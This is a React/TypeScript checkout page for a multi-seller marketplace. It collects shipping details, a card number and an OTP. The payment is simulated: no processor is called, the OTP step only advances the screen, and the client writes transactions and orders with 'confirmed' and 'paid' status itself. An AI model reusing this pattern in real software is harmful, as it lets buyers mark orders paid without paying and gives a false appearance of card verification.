import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { ArrowLeft, Package, Store } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Separator } from '@/components/ui/separator';
import { supabase } from '@/integrations/supabase/client';
import { useAuth } from '@/hooks/useAuth';
import { useCart, CartItem } from '@/hooks/useCart';
import { usePaymentSettings } from '@/hooks/usePaymentSettings';
import { useCurrency } from '@/hooks/useCurrency';
import { toast } from '@/hooks/use-toast';
import { Header } from '@/components/layout/Header';

import CheckoutStepper, { CheckoutStep } from '@/components/checkout/CheckoutStepper';
import ShippingAddressForm, { ShippingFormData } from '@/components/checkout/ShippingAddressForm';
import PaymentDetailsForm, { CardFormData } from '@/components/checkout/PaymentDetailsForm';
import CardOTPVerification from '@/components/checkout/CardOTPVerification';
import OrderReview from '@/components/checkout/OrderReview';
import OrderConfirmation from '@/components/checkout/OrderConfirmation';
import PaymentProcessingScreen from '@/components/checkout/PaymentProcessingScreen';

interface SellerGroup {
  sellerId: string;
  sellerName: string;
  items: CartItem[];
  subtotal: number;
}

export default function CartCheckout() {
  const navigate = useNavigate();
  const { user, loading: authLoading } = useAuth();
  const { items, clearCart, total } = useCart();
  const { formatPriceOnly } = useCurrency();
  const { settings: paymentSettings, loading: settingsLoading } = usePaymentSettings();

  const [step, setStep] = useState<CheckoutStep>('shipping');
  const [shippingData, setShippingData] = useState<ShippingFormData | null>(null);
  const [cardData, setCardData] = useState<CardFormData | null>(null);
  const [cardBrand, setCardBrand] = useState('Card');
  const [orderIds, setOrderIds] = useState<string[]>([]);
  const [processing, setProcessing] = useState(false);
  const [transactionId, setTransactionId] = useState<string | null>(null);

  useEffect(() => {
    if (!authLoading && !user) {
      navigate('/auth?redirect=/cart/checkout');
    }
    if (items.length === 0 && step === 'shipping') {
      navigate('/cart');
    }
  }, [user, authLoading, items.length, step, navigate]);

  // Group cart items by seller
  const sellerGroups: SellerGroup[] = items.reduce((groups: SellerGroup[], item) => {
    const group = groups.find(g => g.sellerId === item.seller_id);
    if (group) {
      group.items.push(item);
      group.subtotal += item.price * item.quantity;
    } else {
      groups.push({
        sellerId: item.seller_id,
        sellerName: item.seller_name,
        items: [item],
        subtotal: item.price * item.quantity,
      });
    }
    return groups;
  }, []);

  const handleShippingSubmit = (data: ShippingFormData) => {
    setShippingData(data);
    setStep('payment');
  };

  const handlePaymentSubmit = async (data: CardFormData & { is3DSecure?: boolean }) => {
    if (!user) return;

    setProcessing(true);
    setCardData(data);

    const is3DS = data.is3DSecure ?? true;
    const lastFour = data.cardNumber.replace(/\s/g, '').slice(-4);
    const brand = detectCardBrand(data.cardNumber);
    setCardBrand(brand);

    try {
      const { data: tx, error } = await supabase
        .from('payment_transactions')
        .insert({
          user_id: user.id,
          amount: total,
          currency: 'USD',
          card_last_four: lastFour,
          card_brand: brand,
          status: is3DS ? 'pending_otp' : 'confirmed',
        })
        .select()
        .single();

      if (error) throw error;
      setTransactionId(tx.id);

      setStep(is3DS ? 'processingPayment' : 'review');
    } catch (e: any) {
      toast({ title: 'Payment error', description: e.message, variant: 'destructive' });
    } finally {
      setProcessing(false);
    }
  };

  // FIRST processing screen → OTP
  const handlePaymentProcessingComplete = () => {
    setStep('otp');
  };

  // OTP → SECOND processing screen
  const handleOTPVerified = async () => {
    setStep('processingOtp');
  };

  // SECOND processing → Review
  const handleOTPProcessingComplete = () => {
    setStep('review');
  };

  const handleConfirmOrder = async () => {
    if (!user || !shippingData) return;

    setProcessing(true);
    try {
      const ids: string[] = [];

      for (const item of items) {
        const { data, error } = await supabase
          .from('orders')
          .insert({
            buyer_id: user.id,
            seller_id: item.seller_id,
            product_id: item.product_id,
            quantity: item.quantity,
            total_price: item.price * item.quantity,
            status: 'paid',
            tracking_info: {
              shipping_address: shippingData,
            },
          })
          .select()
          .single();

        if (error) throw error;
        ids.push(data.id);
      }

      setOrderIds(ids);
      clearCart();
      setStep('confirmation');
    } catch (e: any) {
      toast({ title: 'Order error', description: e.message, variant: 'destructive' });
    } finally {
      setProcessing(false);
    }
  };

  const detectCardBrand = (num: string) => {
    const c = num.replace(/\s/g, '');
    if (/^4/.test(c)) return 'Visa';
    if (/^5[1-5]/.test(c)) return 'Mastercard';
    if (/^3[47]/.test(c)) return 'American Express';
    return 'Card';
  };

  if (authLoading || settingsLoading) {
    return null;
  }

  return (
    <div className="min-h-screen bg-background">
      <Header />
      <div className="container py-8">
        <CheckoutStepper currentStep={step} />

        <div className="grid lg:grid-cols-3 gap-8 mt-6">
          <div className="lg:col-span-2">

            {step === 'shipping' && (
              <ShippingAddressForm onSubmit={handleShippingSubmit} />
            )}

            {step === 'payment' && (
              <PaymentDetailsForm
                amount={total}
                currency="USD"
                onSubmit={handlePaymentSubmit}
              />
            )}

            {step === 'processingPayment' && cardData && (
              <PaymentProcessingScreen
                title="Processing Payment"
                description="Verifying card details…"
                onComplete={handlePaymentProcessingComplete}
              />
            )}

            {step === 'otp' && cardData && (
              <CardOTPVerification
                cardLastFour={cardData.cardNumber.slice(-4)}
                onVerified={handleOTPVerified}
                onResend={() => toast({ title: 'OTP resent' })}
              />
            )}

            {step === 'processingOtp' && (
              <PaymentProcessingScreen
                title="Verifying OTP"
                description="Finalizing verification…"
                onComplete={handleOTPProcessingComplete}
              />
            )}

            {step === 'review' && shippingData && cardData && (
              <OrderReview
                items={items}
                shippingData={shippingData}
                cardData={cardData}
                totalAmount={total}
                currency="USD"
                onConfirm={handleConfirmOrder}
              />
            )}

            {step === 'confirmation' && shippingData && (
              <OrderConfirmation
                orderIds={orderIds}
                totalAmount={total}
                currency="USD"
                shippingAddress={{
                  fullName: shippingData.fullName,
                  line1: shippingData.streetAddress,
                  city: shippingData.city,
                  state: shippingData.stateProvince,
                  postalCode: shippingData.postalCode,
                  country: shippingData.country,
                }}
              />
            )}
          </div>

          {step !== 'confirmation' && (
            <div className="lg:col-span-1">
              <Card>
                <CardHeader>
                  <CardTitle>Order Summary</CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="flex justify-between font-bold">
                    <span>Total</span>
                    <span>{formatPriceOnly(total)}</span>
                  </div>
                </CardContent>
              </Card>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
